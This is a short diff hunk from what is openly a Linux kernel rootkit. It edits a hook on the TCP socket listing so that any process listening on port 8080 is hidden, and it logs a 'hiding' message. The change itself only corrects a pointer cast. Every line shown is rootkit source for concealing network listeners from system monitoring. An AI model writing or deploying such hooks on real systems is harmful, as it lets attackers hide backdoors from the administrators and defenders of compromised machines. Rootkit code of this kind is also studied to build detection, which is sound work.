@@ -24,7 +24,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 	struct sock *sk = v;
 
 	/* 0x1f90 = 8080 in hex */
-	if (sk != 0x1 && sk->sk_num == 0x1f90)
+	if (sk != (struct sock *)0x1 && sk->sk_num == 0x1f90)
 	{
 		printk(KERN_DEBUG "rootkit: Found process listening on port 8080 - hiding!\n");
 		return 0;
